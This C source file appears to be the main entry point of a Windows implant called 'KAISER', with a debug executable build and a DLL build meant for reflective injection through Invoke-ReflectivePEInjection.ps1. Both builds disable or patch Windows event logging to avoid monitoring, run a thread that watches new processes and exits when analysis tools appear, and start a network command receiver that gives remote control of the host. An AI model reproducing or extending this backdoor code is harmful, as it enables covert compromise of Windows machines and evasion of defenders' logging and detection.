#include <Windows.h>

#include "command.h"
#include "evtlog.h"
#include "networking.h"
#include "purge.h"
#include "utils.h"

#ifdef _DEBUG
int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
	// No, sir! I would not like to be monitored!
	EvtlogAction(EVTLOG_DISABLE);
	
	// Watch for new processes and die on anything dangerous.
	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PurgeProcessMonitor, NULL, 0, NULL) == NULL) {
		//NetSend(L"Failed to create process notification thread; error: %lu", GetLastError());
	}

	INT iSuccess = InitWsa();
	if (iSuccess) {
		Debug(FAILURE, L"Failed to initialise Winsock; error: %d", iSuccess);
		return 1;
	}

	CommandStartReceiver();

	FreeWsa();

	return 0;
}
#else
// For Invoke-ReflectivePEInjection.ps1
__declspec(dllexport) void VoidFunc(void) {
	// Mutex to stop multiple instances.
	HANDLE hMutex = CreateMutex(NULL, TRUE, L"KAISER");
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		return;
	}

	// No, sir! I would not like to be monitored!
	EvtlogAction(EVTLOG_PATCH);

	// Watch for new processes and die on anything dangerous.
	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PurgeProcessMonitor, NULL, 0, NULL) == NULL) {
		NetSend(L"Failed to create process notification thread; error: %lu", GetLastError());
	}

	INT iSuccess = InitWsa();
	if (iSuccess) {
		Debug(FAILURE, L"Failed to initialise Winsock; error: %d", iSuccess);
		return;
	}
	
	CommandStartReceiver();
	
	ReleaseMutex(hMutex);

	FreeWsa();
}

BOOL APIENTRY DllMain(HINSTANCE hInstance, DWORD fdwReason, LPVOID lpReserved) {
	switch (fdwReason) {
		case DLL_PROCESS_ATTACH:
			break;
	}

	return TRUE;
}
#endif